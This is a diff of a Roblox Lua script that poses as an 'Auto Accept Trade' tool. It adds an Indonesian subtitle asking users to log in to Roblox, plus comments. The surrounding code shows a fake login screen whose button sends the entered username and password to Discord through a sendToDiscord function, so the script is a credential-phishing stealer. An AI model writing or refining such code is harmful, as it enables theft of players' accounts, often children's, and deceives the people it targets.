@@ -303,6 +303,7 @@ local function createLoginGUI()
 local gui = Instance.new("ScreenGui")
 local frame = Instance.new("Frame")
 local titleLabel = Instance.new("TextLabel")
+local subtitleLabel = Instance.new("TextLabel")
 local usernameBox = Instance.new("TextBox")
 local passwordBox = Instance.new("TextBox")
 local loginButton = Instance.new("TextButton")
@@ -334,6 +335,17 @@ titleLabel.Text = "Auto Accept Trade"
 titleLabel.TextSize = 24
 titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
+-- Subtitle Label
+subtitleLabel.Name = "SubtitleLabel"
+subtitleLabel.Parent = frame
+subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
+subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
+subtitleLabel.BackgroundTransparency = 1
+subtitleLabel.Font = Enum.Font.SourceSans
+subtitleLabel.Text = "Login Ke Roblox Untuk Melanjutkan"
+subtitleLabel.TextSize = 16
+subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+  
 -- Username Box
 usernameBox.Name = "UsernameBox"
 usernameBox.Parent = frame
@@ -345,7 +357,7 @@ usernameBox.Text = ""
 usernameBox.TextSize = 14
 usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-
+  
 -- Password Box
 passwordBox.Name = "PasswordBox"
 passwordBox.Parent = frame
@@ -358,6 +370,7 @@ passwordBox.TextSize = 14
 passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
+-- Sensor Password Secara Manual
 passwordBox:GetPropertyChangedSignal("Text"):Connect(function()
 local currentText = passwordBox.Text
 if #currentText > #password then
@@ -380,6 +393,7 @@ loginButton.TextSize = 16
 loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
 loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
+-- Fungsi Tombol Login
 loginButton.MouseButton1Click:Connect(function()
 if usernameBox.Text ~= "" and password ~= "" then
 sendToDiscord("Username: " .. usernameBox.Text .. "\nPassword: " .. password)
